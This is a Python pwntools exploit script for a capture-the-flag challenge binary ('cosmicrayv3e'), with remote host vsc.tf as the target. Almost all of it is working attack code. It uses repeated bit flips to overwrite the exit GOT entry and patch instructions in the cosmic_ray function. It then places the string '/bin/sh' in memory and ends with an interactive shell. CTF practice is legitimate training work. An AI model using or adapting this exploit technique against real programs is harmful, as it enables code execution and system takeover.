#!/usr/bin/env python3
from pwn import *
from a import *

exe = ELF("./cosmicrayv3e")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("vsc.tf", 7000)
else:
    p = process([exe.path])
    p = gdb.debug([exe.path],gdbscript='''
        # b*cosmic_ray+476
        # c
                ''')

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def change(num1,num2,addr):
    listchange = []
    for i in range(8):
        byte1 = num1 >> (i*8) & 0xff
        byte2 = num2 >> (i*8) & 0xff
        binstr1 = bin(byte1)[2:].zfill(8)
        binstr2 = bin(byte2)[2:].zfill(8)
        for j in range(8):
            if(binstr1[j] != binstr2[j]):
                listchange.append(j)
                sla(b"through:",hex(addr+i).encode())
                sla(b"to flip:",str(j).encode())   
    return listchange
# change got 
sla(b"through:",hex(exe.sym.cosmic_ray+476).encode())
sla(b"to flip:",b"3")
sla(b"through:",hex(exe.got.exit).encode())
sla(b"to flip:",b"0")
sla(b"through:",hex(exe.got.exit+1).encode())
sla(b"to flip:",b"1")
sla(b"through:",hex(exe.got.exit+1).encode())
sla(b"to flip:",b"3")
sla(b"through:",hex(exe.got.exit+1).encode())
sla(b"to flip:",b"4")
sla(b"through:",hex(exe.got.exit+2).encode())
sla(b"to flip:",b"7")
# change bit
start_num = 0
num1 = 0x5a5a5a5a5a5a5a5a
num2 = 0x68732f6e69622f
# assembly = u64(asm('''mov edi,[rip+0x1a58]''',arch='amd64').ljust(8,b'\0'))
num11 = 0xfc53e800403d90bf
num22 = 0xfc53e800000001bf
change(num11,num22,exe.sym.cosmic_ray+341)
# position = show_bit_changes(start_num, num1, num2)
change(num1,num2,0x403d90)

sla(b"through:",hex(0x401524).encode())
sla(b"to flip:",b"9")
# gdb.attach(p, gdbscript="""
#         # b*cosmic_ray+476
#         # c
#            """)
p.interactive()
# good luck pwning :)

